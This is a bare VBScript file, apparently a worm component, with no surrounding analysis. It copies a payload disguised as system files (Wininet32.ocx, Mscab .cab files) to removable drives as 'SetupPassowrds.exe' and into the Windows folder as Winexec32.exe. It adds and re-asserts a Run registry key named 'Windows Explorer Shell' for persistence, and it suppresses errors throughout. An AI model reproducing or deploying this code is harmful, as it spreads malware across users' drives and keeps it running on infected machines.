On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsc = CreateObject("WScript.Shell")
WinDir = TextBreak(fso.GetSpecialFolder(0))
SysDir = TextBreak(fso.GetSpecialFolder(1))
For Each DriveLoop In fso.Drives
If DriveLoop.DriveType = 2 Or DriveLoop = 3 Then
If DriveLoop.IsReady Then
If TextBreak(UCase(DriveLoop.Path)) <> "C:" Then
If fso.FileExists(SysDir & "\Wininet32.ocx") Then
fso.CopyFile SysDir & "\Wininet32.ocx", TextBreak(DriveLoop.Path) & "\SetupPassowrds.exe"
End If
End If
End If
End If
Next
W32OutsiderKey = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Windows Explorer Shell"
W32OutsiderValue = WinDir & "\Winexec32.exe"
If Not fso.FileExists(WinDir & "\Winexec32.exe") Then
For FileCopyLoop = 1 To 6
WCopy = SysDir & "\Mscab" & FileCopyLoop & "_32.cab"
If fso.FileExists(WCopy) Then
fso.CopyFile WCopy, WinDir & "\Winexec32.exe"
wsc.RegWrite W32OutsiderKey, W32OutsiderValue
End If
Next
End If
ReadKey = wsc.RegRead(W32OutsiderKey)
If ReadKey <> W32OutsiderValue Then
wsc.RegWrite W32OutsiderKey, W32OutsiderValue
End If
Function TextBreak(TextStr)
On Error Resume Next
If Right(TextStr, 1) = "\" Then
TextBreak = Left(TextStr, Len(TextStr) - 1)
Else
TextBreak = TextStr
End If
End Function
